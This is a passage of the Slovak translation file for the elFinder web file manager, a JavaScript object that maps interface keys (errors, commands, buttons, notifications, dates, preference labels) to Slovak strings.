/**
 * Slovenčina translation
 * @author RobiNN <kelcakrobo@gmail.com>
 * @author Jakub Ďuraš <jkblmr@gmail.com>
 * @version 2022-03-03
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.sk = {
		translator : 'RobiNN &lt;kelcakrobo@gmail.com&gt;, Jakub Ďuraš &lt;jkblmr@gmail.com&gt;',
		language   : 'Slovenčina',
		direction  : 'ltr',
		dateFormat : 'd.m.Y H:i', // will show like: 03.03.2022 11:36
		fancyDateFormat : '$1 H:i', // will show like: Dnes 11:36
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220303-113626
		messages   : {
			'getShareText' : 'zdieľam',
			'Editor ': 'Editor kódu',

			/********************************** errors **********************************/
			'error'                : 'Chyba',
			'errUnknown'           : 'Neznáma chyba.',
			'errUnknownCmd'        : 'Neznámy príkaz.',
			'errJqui'              : 'Nesprávna jQuery UI konfigurácia. Selectable, draggable a droppable musia byť načítané.',
			'errNode'              : 'elFinder vyžaduje vytvorenie DOM elementu.',
			'errURL'               : 'Nesprávna elFinder konfigurácia! URL nie je definovaná.',
			'errAccess'            : 'Prístup zamietnutý.',
			'errConnect'           : 'Nepodarilo sa pripojiť do backendu.',
			'errAbort'             : 'Spojenie bolo prerušené.',
			'errTimeout'           : 'Časový limit vypršal.',
			'errNotFound'          : 'Backend nenájdený.',
			'errResponse'          : 'Nesprávna backend odpoveď.',
			'errConf'              : 'Nesprávna backend konfigurácia.',
			'errJSON'              : 'PHP JSON modul nie je nainštalovaný.',
			'errNoVolumes'         : 'Nie sú dostupné žiadne čitateľné média.',
			'errCmdParams'         : 'Nesprávne parametre pre príkaz "$1".',
			'errDataNotJSON'       : 'Dáta nie sú formátu JSON.',
			'errDataEmpty'         : 'Prázdne dáta.',
			'errCmdReq'            : 'Backend požiadavka požaduje názov príkazu.',
			'errOpen'              : 'Nie je možné otvoriť "$1".',
			'errNotFolder'         : 'Objekt nie je priečinok.',
			'errNotFile'           : 'Objekt nie je súbor.',
			'errRead'              : 'Nie je možné prečítať "$1".',
			'errWrite'             : 'Nie je možné písať do "$1".',
			'errPerm'              : 'Prístup zamietnutý.',
			'errLocked'            : '"$1" je uzamknutý a nemôže byť premenovaný, presunutý alebo odstránený.',
			'errExists'            : 'Položka s názvom "$1" už existuje.',
			'errInvName'           : 'Neplatný názov súboru.',
			'errInvDirname'        : 'Neplatný názov priečinka.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Priečinok nebol nájdený.',
			'errFileNotFound'      : 'Súbor nenájdený.',
			'errTrgFolderNotFound' : 'Cieľový priečinok "$1" sa nenašiel.',
			'errPopup'             : 'Prehliadač zabránil otvoreniu vyskakovacieho okna. Pre otvorenie súboru povoľte vyskakovacie okná.',
			'errMkdir'             : 'Nepodarilo sa vytvoriť priečinok "$1".',
			'errMkfile'            : 'Nepodarilo sa vytvoriť súbor "$1".',
			'errRename'            : 'Nepodarilo sa premenovať "$1".',
			'errCopyFrom'          : 'Kopírovanie súborov z média "$1" nie je povolené.',
			'errCopyTo'            : 'Kopírovanie súborov na médium "$1" nie je povolené.',
			'errMkOutLink'         : 'Nie je možné vytvoriť odkaz mimo koreňového zväzku.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Chyba pri nahrávaní.',  // old name - errUploadCommon
			'errUploadFile'        : 'Nepodarilo sa nahrať "$1".', // old name - errUpload
			'errUploadNoFiles'     : 'Neboli nájdené žiadne súbory na nahranie.',
			'errUploadTotalSize'   : 'Dáta prekračujú maximálnu povolenú veľkosť.', // old name - errMaxSize
			'errUploadFileSize'    : 'Súbor prekračuje maximálnu povolenú veľkosť.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Nepovolený typ súboru.',
			'errUploadTransfer'    : 'Problém s nahrávaním "$1".',
			'errUploadTemp'        : 'Nepodarilo sa vytvoriť dočasný súbor na nahranie.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Objekt "$1" na tomto mieste už existuje a nemôže byť nahradený objektom iného typu.', // new
			'errReplace'           : 'Nie je možné nahradiť "$1".',
			'errSave'              : 'Nie je možné uložiť "$1".',
			'errCopy'              : 'Nie je možné kopírovať "$1".',
			'errMove'              : 'Nie je možné preniesť "$1".',
			'errCopyInItself'      : 'Nie je možné kopírovať "$1" do seba.',
			'errRm'                : 'Nie je možné vymazať "$1".',
			'errTrash'             : 'Nie je možné presunúť do koša.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Nie je možné odstrániť zdrojový/é súbor/y.',
			'errExtract'           : 'Nie je možné extrahovať súbory z "$1".',
			'errArchive'           : 'Nie je možné vytvoriť archív.',
			'errArcType'           : 'Nepodporovaný typ archívu.',
			'errNoArchive'         : 'Súbor nie je archív alebo má nepodporovaný typ archívu.',
			'errCmdNoSupport'      : 'Backend nepodporuje tento príkaz.',
			'errReplByChild'       : 'Priečinok "$1" nemôže byť nahradený položkou, ktorú už obsahuje.',
			'errArcSymlinks'       : 'Z bezpečnostných dôvodov bolo zakázané extrahovanie archívov obsahujúcich symlinky, alebo súborov s nepovolenými názvami.', // edited 24.06.2012
			'errArcMaxSize'        : 'Súbory archívu prekračujú maximálnu povolenú veľkosť.',
			'errResize'            : 'Nie je možné zmeniť veľkosť "$1".',
			'errResizeDegree'      : 'Neplatný stupeň otočenia.',  // added 7.3.2013
			'errResizeRotate'      : 'Nie je možné otočiť obrázok.',  // added 7.3.2013
			'errResizeSize'        : 'Neplatná veľkosť obrázka.',  // added 7.3.2013
			'errResizeNoChange'    : 'Veľkosť obrázku sa nezmenila.',  // added 7.3.2013
			'errUsupportType'      : 'Nepodporovaný typ súboru.',
			'errNotUTF8Content'    : 'Súbor "$1" nie je v UTF-8 a nemôže byť upravený.',  // added 9.11.2011
			'errNetMount'          : 'Nie je možné pripojiť "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Nepodporovaný protokol.',     // added 17.04.2012
			'errNetMountFailed'    : 'Pripájanie zlyhalo.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Hosť je požadovaný.', // added 18.04.2012
			'errSessionExpires'    : 'Vaša relácia vypršala kvôli nečinnosti.',
			'errCreatingTempDir'   : 'Nepodarilo sa vytvoriť dočasný adresár: "$1"',
			'errFtpDownloadFile'   : 'Nie je možné stiahnuť súbor z FTP: "$1"',
			'errFtpUploadFile'     : 'Nie je možné nahrať súbor na FTP: "$1"',
			'errFtpMkdir'          : 'Nedá sa vytvoriť vzdialený adresár na FTP: "$1"',
			'errArchiveExec'       : 'Chyba pri archivácii súborov: "$1"',
			'errExtractExec'       : 'Chyba pri extrahovaní súborov: "$1"',
			'errNetUnMount'        : 'Nepodarilo sa odpojiť', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Nie je prevoditeľný na UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Vyskúšajte moderný prehliadač, ak chcete nahrať priečinok.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Vypršal časový limit pri hľadaní "$1". Výsledok vyhľadávania je čiastočný.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Opätovné povolenie je potrebné.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Maximálny počet voliteľných položiek je $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Nepodarilo sa obnoviť z koša. Cieľ obnovenia nie je možné identifikovať.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Editor tohto typu súboru nebol nájdený.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Vyskytla sa chyba na strane servera.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Nepodarilo sa vyprázdniť priečinok "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Existujú ešte ďalšie $1 chyby.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Môžete vytvoriť až $1 priečinkov naraz.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Vytvoriť archív',
			'cmdback'      : 'Späť',
			'cmdcopy'      : 'Kopírovať',
			'cmdcut'       : 'Vystrihnúť',
			'cmddownload'  : 'Stiahnuť',
			'cmdduplicate' : 'Duplikovať',
			'cmdedit'      : 'Upraviť súbor',
			'cmdextract'   : 'Extrahovať súbory z archívu',
			'cmdforward'   : 'Ďalej',
			'cmdgetfile'   : 'Vybrať súbory',
			'cmdhelp'      : 'O tomto softvéri',
			'cmdhome'      : 'Domov',
			'cmdinfo'      : 'Info',
			'cmdmkdir'     : 'Nový priečinok',
			'cmdmkdirin'   : 'Do novej zložky', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Nový súbor',
			'cmdopen'      : 'Otvoriť',
			'cmdpaste'     : 'Vložiť',
			'cmdquicklook' : 'Náhľad',
			'cmdreload'    : 'Obnoviť',
			'cmdrename'    : 'Premenovať',
			'cmdrm'        : 'Vymazať',
			'cmdtrash'     : 'Do koša', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Obnoviť', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Nájsť súbory',
			'cmdup'        : 'Prejsť do nadradeného priečinka',
			'cmdupload'    : 'Nahrať súbory',
			'cmdview'      : 'Pozrieť',
			'cmdresize'    : 'Zmeniť veľkosť obrázku',
			'cmdsort'      : 'Zoradiť',
			'cmdnetmount'  : 'Pripojiť sieťové médium', // added 18.04.2012
			'cmdnetunmount': 'Odpojiť', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'Do umiestnení', // added 28.12.2014
			'cmdchmod'     : 'Zmeniť režim', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Otvoriť priečinok', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Resetovať šírku stĺpca', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Celá obrazovka', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Posúvať', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Vyprázdniť priečinok', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Krok späť', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Vykonať znova', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Preferencie', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Vybrať všetko', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Nič nevyberať', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Invertovať výber', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Otvoriť v novom okne', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Skryť (Predvoľba)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Zavrieť',
			'btnSave'   : 'Uložiť',
			'btnRm'     : 'Vymazať',
			'btnApply'  : 'Použiť',
			'btnCancel' : 'Zrušiť',
			'btnNo'     : 'Nie',
			'btnYes'    : 'Áno',
			'btnMount'  : 'Pripojiť',  // added 18.04.2012
			'btnApprove': 'Ísť na $1 & schváliť', // from v2.1 added 26.04.2012
			'btnUnmount': 'Odpojiť', // from v2.1 added 30.04.2012
			'btnConv'   : 'Previesť', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Tu',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Médium',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Všetko',       // from v2.1 added 22.5.2015
			'btnMime'   : 'MIME typ', // from v2.1 added 22.5.2015
			'btnFileName':'Názov súboru',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Uložiť & zavrieť', // from v2.1 added 12.6.2015
			'btnBackup' : 'Zálohovať', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Premenovať',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Premenovať všetko', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Predchádzajúce ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Ďalšie ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Uložiť ako', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Otváranie priečinka',
			'ntffile'     : 'Otváranie súboru',
			'ntfreload'   : 'Znovu-načítanie obsahu priečinka',
			'ntfmkdir'    : 'Vytváranie priečinka',
			'ntfmkfile'   : 'Vytváranie súborov',
			'ntfrm'       : 'Vymazanie položiek',
			'ntfcopy'     : 'Kopírovanie položiek',
			'ntfmove'     : 'Premiestnenie položiek',
			'ntfprepare'  : 'Kontrola existujúcich položiek',
			'ntfrename'   : 'Premenovanie súborov',
			'ntfupload'   : 'Nahrávanie súborov',
			'ntfdownload' : 'Sťahovanie súborov',
			'ntfsave'     : 'Uloženie súborov',
			'ntfarchive'  : 'Vytváranie archívu',
			'ntfextract'  : 'Extrahovanie súborov z archívu',
			'ntfsearch'   : 'Vyhľadávanie súborov',
			'ntfresize'   : 'Zmena veľkosti obrázkov',
			'ntfsmth'     : 'Počkajte prosím...',
			'ntfloadimg'  : 'Načítavanie obrázka',
			'ntfnetmount' : 'Pripájanie sieťového média', // added 18.04.2012
			'ntfnetunmount': 'Odpájanie sieťového média', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Získanie rozmeru obrázka', // added 20.05.2013
			'ntfreaddir'  : 'Čítajú sa informácie o priečinku', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Získanie adresy URL odkazu', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Zmena súboru', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Overenie názvu nahravaného súboru', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Vytvorenie súboru na stiahnutie', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Získanie informácií o ceste', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Spracovanie nahraného súboru', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Vhadzovanie do koša', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Vykonávanie obnovy z koša', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Kontrola cieľového priečinka', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Zrušiť predchádzajúcu operáciu', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Obnovenie predchádzajúceho zrušenia', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Kontrola obsahu', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Kôš', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'neznámy',
			'Today'       : 'Dnes',
			'Yesterday'   : 'Včera',
			'msJan'       : 'jan',
			'msFeb'       : 'feb',
			'msMar'       : 'Mar',
			'msApr'       : 'Apr',
			'msMay'       : 'Maj',
			'msJun'       : 'Jun',
			'msJul'       : 'Júl',
			'msAug'       : 'Aug',
			'msSep'       : 'sept',
			'msOct'       : 'Okt',
			'msNov'       : 'Nov',
			'msDec'       : 'dec',
			'January'     : 'Január',
			'February'    : 'Február',
			'March'       : 'Marec',
			'April'       : 'Apríl',
			'May'         : 'Máj',
			'June'        : 'Jún',
			'July'        : 'Júl',
			'August'      : 'augusta',
			'September'   : 'septembra',
			'October'     : 'Október',
			'November'    : 'novembra',
			'December'    : 'December',
			'Sunday'      : 'Nedeľa',
			'Monday'      : 'Pondelok',
			'Tuesday'     : 'Utorok',
			'Wednesday'   : 'Streda',
			'Thursday'    : 'Štvrtok',
			'Friday'      : 'Piatok',
			'Saturday'    : 'Sobota',
			'Sun'         : 'Ned',
			'Mon'         : 'Pon',
			'Tue'         : 'Ut',
			'Wed'         : 'Str',
			'Thu'         : 'Štv',
			'Fri'         : 'Pia',
			'Sat'         : 'Sob',

			/******************************** sort variants ********************************/
			'sortname'          : 'podľa názvu',
			'sortkind'          : 'podľa druhu',
			'sortsize'          : 'podľa veľkosti',
			'sortdate'          : 'podľa dátumu',
			'sortFoldersFirst'  : 'Najskôr priečinky',
			'sortperm'          : 'podľa povolenia', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'podľa módu',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'podľa majiteľa',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'podľa skupiny',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Tiež stromové zobrazenie',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'Nový súbor.txt', // added 10.11.2015
			'untitled folder'   : 'Nový priečinok',   // added 10.11.2015
			'Archive'           : 'Nový archív',  // from v2.1 added 10.11.2015
			'untitled file'     : 'Nový súbor.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1 súbor',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Potrebné potvrdenie',
			'confirmRm'       : 'Určite chcete vymazať súbory?<br/>Nie je to možné vrátiť späť!',
			'confirmRepl'     : 'Nahradiť starý súbor za nový? (Ak obsahuje priečinky, bude zlúčené. Ak chcete zálohovať a nahradiť, vyberte možnosť Zálohovať.)',
			'confirmRest'     : 'Nahradiť existujúcu položku s položkou v koši?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Nie je v UTF-8<br/>Previesť na UTF-8?<br/>Obsah bude v UTF-8 po uložení konverzie.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Kódovanie tohto súboru nemohlo byť detekované. Pre úpravu dočasne potrebujete previesť na UTF-8 .<br/>Prosím, vyberte kódovanie znakov tohto súboru.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Bol upravený.<br/>Ak zmeny neuložíte, stratíte vykonanú prácu.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Naozaj chcete presunúť položky do koša?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Naozaj chcete presunúť položky do "$1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Použiť na všetky',
			'name'            : 'Názov',
			'size'            : 'Veľkosť',
			'perms'           : 'Povolenia',
			'modify'          : 'Zmenené',
			'kind'            : 'Druh',
			'read'            : 'čítať',
			'write'           : 'zapisovať',
			'noaccess'        : 'bez prístupu',
			'and'             : 'a',
			'unknown'         : 'neznámy',
			'selectall'       : 'Vybrať všetky položky',
			'selectfiles'     : 'Vybrať položku(y)',
			'selectffile'     : 'Vybrať prvú položku',
			'selectlfile'     : 'Vybrať poslednú položku',
			'viewlist'        : 'Zoznam',
			'viewicons'       : 'Ikony',
			'viewSmall'       : 'Malé ikony', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Stredné ikony', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Veľké ikony', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Extra veľké ikony', // from v2.1.39 added 22.5.2018
			'places'          : 'Miesta',
			'calc'            : 'Prepočítavanie',
			'path'            : 'Cesta',
			'aliasfor'        : 'Alias pre',
			'locked'          : 'Uzamknuté',
			'dim'             : 'Rozmery',
			'files'           : 'Súbory',
			'folders'         : 'Priečinky',
			'items'           : 'Položky',
			'yes'             : 'áno',
			'no'              : 'nie',
			'link'            : 'Odkaz',
			'searcresult'     : 'Výsledky hľadania',
			'selected'        : 'zvolené položky',
			'about'           : 'O aplikácii',
			'shortcuts'       : 'Skratky',
			'help'            : 'Pomoc',
			'webfm'           : 'Webový správca súborov',
			'ver'             : 'Verzia',
			'protocolver'     : 'verzia protokolu',
			'homepage'        : 'Domovská stránka',
			'docs'            : 'Dokumentácia',
			'github'          : 'Pozri nás na Githube',
			'twitter'         : 'Nasleduj nás na Twitteri',
			'facebook'        : 'Pripoj sa k nám na Facebooku',
			'team'            : 'Tím',
			'chiefdev'        : 'Hlavný vývojár',
			'developer'       : 'Vývojár',
			'contributor'     : 'Prispievateľ',
			'maintainer'      : 'Správca',
			'translator'      : 'Prekladateľ',
			'icons'           : 'Ikony',
			'dontforget'      : 'a nezabudnite si plavky',
			'shortcutsof'     : 'Skratky nie sú povolené',
			'dropFiles'       : 'Sem pretiahnite súbory',
			'or'              : 'alebo',
			'selectForUpload' : 'Vyberte súbory',
			'moveFiles'       : 'Premiestniť súbory',
			'copyFiles'       : 'Kopírovať súbory',
			'restoreFiles'    : 'Obnoviť položky', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Odstrániť z umiestnení',
			'aspectRatio'     : 'Pomer zobrazenia',
			'scale'           : 'Mierka',
			'width'           : 'Šírka',
			'height'          : 'Výška',
			'resize'          : 'Zmeniť veľkosť',
			'crop'            : 'Orezať',
			'rotate'          : 'Otočiť',
			'rotate-cw'       : 'Otočiť o 90 stupňov (v smere h.r.)',
			'rotate-ccw'      : 'Otočiť o 90 stupňov (proti smeru)',
			'degree'          : '°',
			'netMountDialogTitle' : 'Pripojiť sieťové médium', // added 18.04.2012
			'protocol'            : 'Protokol', // added 18.04.2012
			'host'                : 'Hosť', // added 18.04.2012
			'port'                : 'Port', // added 18.04.2012
			'user'                : 'Užívateľ', // added 18.04.2012
			'pass'                : 'Heslo', // added 18.04.2012
			'confirmUnmount'      : 'Naozaj chcete odpojiť $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Premiestnite alebo presuňte súbory z prehliadača', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Tu premiestnite alebo presuňte súbory a adresy URL', // from v2.1 added 07.04.2014
			'encoding'        : 'Kódovanie', // from v2.1 added 19.12.2014
			'locale'          : 'Lokalizácia',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Cieľ: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Vyhľadávanie podľa vstupného MIME typu', // from v2.1 added 22.5.2015
			'owner'           : 'Majiteľ', // from v2.1 added 20.6.2015
			'group'           : 'Skupina', // from v2.1 added 20.6.2015
			'other'           : 'Ostatné', // from v2.1 added 20.6.2015
			'execute'         : 'Spustiť', // from v2.1 added 20.6.2015
			'perm'            : 'Povolenie', // from v2.1 added 20.6.2015
			'mode'            : 'Režim', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Priečinok je prázdny', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Priečinok je prázdny\\A Premiestnite alebo presuňte položky', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Priečinok je prázdny\\A Dlhým kliknutím pridáte položky', // from v2.1.6 added 30.12.2015
			'quality'         : 'Kvalita', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Automatická synchronizácia',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Posunúť nahor',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Získať URL odkaz', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Vybraté položky ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID priečinka', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Povoliť prístup v offline režime', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Znova overiť', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Práve načítava...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Otvorenie viacerých súborov', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Pokúšate sa otvoriť súbor $1. Naozaj ho chcete otvoriť v prehliadači?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Výsledky vyhľadávania sú prázdne v hľadanom cieli.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Je to úprava súboru.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Vybrali ste $1 položky.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Máte $1 položky v schránke.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Prírastkové hľadanie je iba z aktuálneho zobrazenia.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Obnovovanie', // from v2.1.15 added 3.8.2016
			'complete'        : '$1: kompletné', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Kontextové menu', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Otáčanie stránky', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Korene média', // from v2.1.16 added 16.9.2016
			'reset'           : 'Resetovať', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Farba pozadia', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Výber farby', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : '8px mriežka', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Povolené', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Zakázané', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Výsledky vyhľadávania sú prázdne v aktuálnom zobrazení. Stlačením tlačidla [Enter] rozšírite vyhľadávanie cieľa.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Výsledky vyhľadávania prvého listu sú v aktuálnom zobrazení prázdne.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Nápis textu', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '$1 minút ostáva', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Otvoriť s vybratým kódovaním', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Uložiť s vybratým kódovaním', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Vyberte priečinok', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Hľadanie prvého listu', // from v2.1.23 added 24.3.2017
			'presets'         : 'Presety', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Je to príliš veľa položiek, takže sa nemôže dostať do koša.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'Textarea', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Vyprázdniť priečinok "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'V priečinku "$1" nie sú žiadne položky.', // from v2.1.25 added 22.6.2017
			'preference'      : 'Preferencie', // from v2.1.26 added 28.6.2017
			'language'        : 'Nastavenie jazyka', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Inicializujte nastavenia uložené v tomto prehliadači', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Nastavenie panela s nástrojmi', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '...$1 znakov ostáva.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '...$1 riadkov ostáva.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Súčet', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Hrubá veľkosť súboru', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Zameranie na prvok dialógu s mouseover',  // from v2.1.30 added 2.11.2017
			'select'          : 'Vybrať', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Akcia pri vybranom súbore', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Otvoriť pomocou naposledy použitého editora', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Invertovať výber položiek', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Naozaj chcete premenovať $1 vybraných položiek, ako napríklad $2<br/>Nie je to možné vrátiť späť!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Batch premenovanie', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Číslo', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Pridať predponu', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Pridať príponu', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Zmeniť príponu', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Nastavenia stĺpcov (zoznamové zobrazenie)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Všetky zmeny sa okamžite premietnu do archívu.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Akékoľvek zmeny sa neodzrkadľujú, kým sa toto médium neodinštaluje.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Nasledujúce médium(a) pripojené v tomto médiu je tiež odpojené. Určite ho odpojiť?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Informácie o výbere', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Algoritmy na zobrazenie hashu súborov', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Informačné položky (panel s informáciami o výbere)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Opätovným stlačením opustíte.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Panel nástrojov', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Pracovný priestor', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Dialóg', // from v2.1.38 added 4.4.2018
			'all'             : 'Všetko', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Veľkosť ikony (zobrazenie ikon)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Otvorte maximalizované okno editora', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Pretože konverzia podľa rozhrania API momentálne nie je k dispozícii, skonvertujte na webovej stránke.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'Po konverzii musíte nahrať skonvertovaný súbor pomocou URL položky alebo stiahnutý súbor na uloženie skonvertovaného súboru.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Konvertovať na stránke $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Integrácie', // from v2.1.40 added 11.7.2018
